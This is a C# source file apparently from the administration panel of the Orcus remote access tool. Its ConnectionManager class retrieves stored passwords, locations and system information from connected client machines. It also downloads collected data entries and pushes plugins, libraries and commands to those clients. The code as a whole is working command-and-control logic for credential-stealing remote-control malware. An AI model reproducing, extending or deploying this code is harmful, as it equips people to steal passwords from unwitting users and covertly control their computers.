using System;
using System.Collections.Generic;
using System.IO;
using System.IO.Compression;
using System.Linq;
using System.Security.Cryptography;
using System.Text;
using System.Threading.Tasks;
using System.Windows;
using Orcus.Administration.Core.Args;
using Orcus.Administration.Core.ClientManagement;
using Orcus.Administration.Core.Logging;
using Orcus.Administration.Core.Plugins.Wrappers;
using Orcus.Administration.Plugins.CommandViewPlugin;
using Orcus.Shared.Client;
using Orcus.Shared.Commands.ComputerInformation;
using Orcus.Shared.Commands.DataManager;
using Orcus.Shared.Commands.ExceptionHandling;
using Orcus.Shared.Commands.Password;
using Orcus.Shared.Communication;
using Orcus.Shared.Connection;
using Orcus.Shared.Core;
using Orcus.Shared.DynamicCommands;
using Orcus.Shared.NetSerializer;

namespace Orcus.Administration.Core
{
    public partial class ConnectionManager : IClientCommands
    {
        private readonly List<OnlineClientInformation> _loginsPending = new List<OnlineClientInformation>();

        public void ChangeGroup(List<BaseClientInformation> clients, string newName)
        {
            ChangeGroup(clients.Select(x => x.Id).ToList(), newName);
        }

        public void ChangeGroup(List<int> clients, string newName)
        {
            Logger.Send(string.Format((string) Application.Current.Resources["ChangeClientsGroup"], clients.Count,
                newName));
            DataTransferProtocolFactory.ExecuteProcedure("ChangeGroup", clients, newName);
        }

        public void RemoveStoredData(List<OfflineClientInformation> clients)
        {
            Logger.Send(clients.Count == 1
                ? string.Format((string) Application.Current.Resources["RemoveClient"], clients[0].UserName)
                : string.Format((string) Application.Current.Resources["RemoveClients"], clients.Count));
            DataTransferProtocolFactory.ExecuteProcedure("RemoveClients", clients.Select(x => x.Id).ToList());
        }

        public void RemoveStoredData(List<ClientViewModel> clients)
        {
            Logger.Send(clients.Count == 1
                ? string.Format((string) Application.Current.Resources["RemoveClient"], clients[0].UserName)
                : string.Format((string) Application.Current.Resources["RemoveClients"], clients.Count));
            DataTransferProtocolFactory.ExecuteProcedure("RemoveClients", clients.Select(x => x.Id).ToList());
        }

        public ComputerInformation GetComputerInformation(BaseClientInformation client)
        {
            var computerInformation = DataTransferProtocolFactory.ExecuteFunction<ComputerInformation>("GetComputerInformation", client.Id);
            computerInformation.Timestamp = computerInformation.Timestamp.ToLocalTime();
            return computerInformation;
        }

        public PasswordData GetPasswords(BaseClientInformation client)
        {
            return DataTransferProtocolFactory.ExecuteFunction<PasswordData>("GetPasswords", client.Id);
        }

        public LocationInfo GetClientLocation(BaseClientInformation client)
        {
            return DataTransferProtocolFactory.ExecuteFunction<LocationInfo>("GetClientLocation", client.Id);
        }

        public List<DataEntry> GetDataEntries()
        {
            var entries = DataTransferProtocolFactory.ExecuteFunction<List<DataEntry>>("GetDataEntries");
            foreach (var dataEntry in entries)
                dataEntry.Timestamp = dataEntry.Timestamp.ToLocalTime();

            return entries;
        }

        public void LogInClient(OnlineClientInformation client)
        {
            if (_loginsPending.Contains(client))
                return;

            _loginsPending.Add(client);
            try
            {
                lock (Sender.WriterLock)
                {
                    Sender.Connection.BinaryWriter.Write((byte) FromAdministrationPackage.InitializeNewSession);
                    Sender.Connection.BinaryWriter.Write(4);
                    Sender.Connection.BinaryWriter.Write(BitConverter.GetBytes(client.Id));
                }
            }
            catch (ObjectDisposedException)
            {
            }

            OnPackageSent("InitializeNewSession", 9);
        }

        public byte[] DownloadEntry(DataEntry dataEntry)
        {
            return DataTransferProtocolFactory.ExecuteFunction<byte[]>("DownloadData", dataEntry.Id);
        }

        public Dictionary<DataEntry, byte[]> DownloadEntries(IEnumerable<DataEntry> dataEntries)
        {
            var result = new Dictionary<DataEntry, byte[]>();
            var dataEntriesList = dataEntries.ToList();

            var downloadedData =
                DataTransferProtocolFactory.ExecuteFunction<List<byte[]>>(
                    "DownloadMultipleData", dataEntriesList.Select(x => x.Id).ToList());

            for (int i = 0; i < downloadedData.Count; i++)
            {
                if (downloadedData[i] != null)
                    result.Add(dataEntriesList[i], downloadedData[i]);
            }

            return result;
        }

        public List<ExceptionInfo> GetExceptions(DateTime from, DateTime to)
        {
            var exceptions = DataTransferProtocolFactory.ExecuteFunction<List<ExceptionInfo>>("GetExceptions", from, to);
            foreach (var exceptionInfo in exceptions)
                exceptionInfo.Timestamp = exceptionInfo.Timestamp.ToLocalTime();

            return exceptions;
        }

        public List<BaseClientInformation> GetAllClients()
        {
            return ClientProvider.GetAllClients();
        }

        public event EventHandler PluginUploadStarted;
        public event EventHandler<PluginUploadProgressChangedEventArgs> PluginUploadProgressChanged;

        public void CloseSession(ClientInformation client)
        {
            lock (Sender.WriterLock)
            {
                Sender.Connection.BinaryWriter.Write((byte) FromAdministrationPackage.CloseSession);
                Sender.Connection.BinaryWriter.Write(4);
                Sender.Connection.BinaryWriter.Write(BitConverter.GetBytes(client.Id));
            }

            OnPackageSent("CloseSession", 9);
        }

        public List<RegisteredDynamicCommand> GetDynamicCommands()
        {
            return DataTransferProtocolFactory.ExecuteFunction<List<RegisteredDynamicCommand>>("GetDynamicCommands",
                null, DynamicCommandInfo.RequiredTypes.ToList());
        }

        public void RemoveDynamicCommands(List<RegisteredDynamicCommand> dynamicCommands)
        {
            DataTransferProtocolFactory.ExecuteProcedure("RemoveDynamicCommands",
                dynamicCommands.Select(x => x.Id).ToList());
        }

        public void StopDynamicCommands(List<RegisteredDynamicCommand> dynamicCommands)
        {
            DataTransferProtocolFactory.ExecuteProcedure("StopDynamicCommands",
                dynamicCommands.Select(x => x.Id).ToList());
        }

        public void StopClientActiveCommands(List<int> clientIds, RegisteredDynamicCommand dynamicCommand)
        {
            DataTransferProtocolFactory.ExecuteProcedure("StopClientActiveCommands", clientIds, dynamicCommand.Id);
        }

        public bool IsStaticCommandPluginAvailable(byte[] pluginHash)
        {
            return DataTransferProtocolFactory.ExecuteFunction<bool>("IsStaticCommandPluginAvailable", pluginHash);
        }

        public int GetStaticCommandPluginId(byte[] pluginHash)
        {
            return DataTransferProtocolFactory.ExecuteFunction<int>("GetStaticCommandPluginResourceId", pluginHash);
        }

        public Statistics GetStatistics()
        {
            return DataTransferProtocolFactory.ExecuteFunction<Statistics>("GetStatistics");
        }

        public List<ClientLocation> GetClientLocations()
        {
            return DataTransferProtocolFactory.ExecuteFunction<List<ClientLocation>>("GetClientLocations");
        }

        public ClientConfig GetClientConfig(OnlineClientInformation onlineClientInformation)
        {
            return DataTransferProtocolFactory.ExecuteFunction<ClientConfig>("GetClientConfig", null,
                new List<Type>(BuilderPropertyHelper.GetAllBuilderPropertyTypes()) {typeof (ClientConfig)},
                onlineClientInformation.Id);
        }

        public void SendStaticCommandPlugin(StaticCommandPlugin staticCommandPlugin)
        {
            using (var fs = new FileStream(staticCommandPlugin.Path, FileMode.Open, FileAccess.Read))
            using (var archive = new ZipArchive(fs, ZipArchiveMode.Read))
            {
                var entry = archive.GetEntry(staticCommandPlugin.PluginInfo.Library1);
                using (var zipStream = entry.Open())
                {
                    var buffer = new byte[8192];
                    lock (Sender.WriterLock)
                    {
                        Sender.Connection.BinaryWriter.Write((byte) FromAdministrationPackage.SendStaticCommandPlugin);
                        Sender.Connection.BinaryWriter.Write((int) entry.Length + 16);
                        Sender.Connection.BinaryWriter.Write(staticCommandPlugin.PluginHash);

                        int read;
                        while ((read = zipStream.Read(buffer, 0, buffer.Length)) > 0)
                        {
                            Sender.Connection.BinaryWriter.Write(buffer, 0, read);
                        }
                    }
                }
            }
        }
        
        public async Task SendPlugin(CommandAndViewPlugin commandAndViewPlugin, int clientId)
        {
            using (var memoryStream = new MemoryStream(commandAndViewPlugin.GetCommandData()))
            {
                var versionData = Encoding.ASCII.GetBytes(commandAndViewPlugin.PluginInfo.Version.ToString());
                byte[] hash;
                using (var md5 = new MD5CryptoServiceProvider())
                    hash = md5.ComputeHash(memoryStream);

                var pluginSize = (int) memoryStream.Length;
                memoryStream.Position = 0;

                PluginUploadStarted?.Invoke(this, EventArgs.Empty);

                await Task.Run(() =>
                {
                    Sender.OpenClientRedirect(clientId, ClientRedirectOptions.IncludeAdministrationId,
                        FromAdministrationPackage.SendPlugin,
                        4 + 16 + 16 + 4 + versionData.Length + pluginSize, writer =>
                        {
                            writer.Write(pluginSize);
                            writer.Write(commandAndViewPlugin.PluginInfo.Guid.ToByteArray());
                            writer.Write(hash);
                            writer.Write(versionData.Length);
                            writer.Write(versionData);

                            var buffer = new byte[8192];
                            var remaningSize = pluginSize;
                            int read;

                            while (remaningSize > 0 &&
                                   (read = memoryStream.Read(buffer, 0, Math.Min(buffer.Length, remaningSize))) > 0)
                            {
                                writer.Write(buffer, 0, read);
                                remaningSize -= read;

                                var progress = (pluginSize - remaningSize)/(double) pluginSize;
                                var bytesSent = pluginSize - remaningSize;

                                Application.Current.Dispatcher.BeginInvoke(
                                    new Action(() => PluginUploadProgressChanged?.Invoke(this,
                                        new PluginUploadProgressChangedEventArgs(
                                            progress,
                                            bytesSent, pluginSize, commandAndViewPlugin.PluginInfo.Name))));
                            }
                        });
                });

                OnPackageSent("SendPlugin", 4 + 4 + 16 + 16 + 4 + versionData.Length + pluginSize);
            }
        }

        public async Task SendLibraries(List<LocalLibraryInfo> libraries, int clientId)
        {
            var portableLibraries = new List<PortableLibraryInfo>();
            var fileStreams = new FileStream[libraries.Count];
            var size = 0;

            try
            {
                for (int i = 0; i < libraries.Count; i++)
                {
                    var library = libraries[i];
                    var fileStream = new FileStream(library.Path, FileMode.Open, FileAccess.Read, FileShare.Read);

                    size += (int) fileStream.Length;
                    portableLibraries.Add(new PortableLibraryInfo
                    {
                        Length = (int) fileStream.Length,
                        Library = library.Library
                    });
                    fileStreams[i] = fileStream;
                }

                var libraryData = Serializer.FastSerialize(portableLibraries);
                await Task.Run(() =>
                {
                    Sender.OpenClientRedirect(clientId, ClientRedirectOptions.IncludeAdministrationId,
                        FromAdministrationPackage.SendLibraries, size + libraryData.Length, writer =>
                        {
                            writer.Write(libraryData);
                            foreach (var fileStream in fileStreams)
                                fileStream.CopyTo(writer.BaseStream);
                        });
                });
                OnPackageSent("SendLibraries", size + libraryData.Length + 14);
            }
            finally
            {
                foreach (var fileStream in fileStreams)
                    fileStream?.Dispose();
            }
        }
    }
}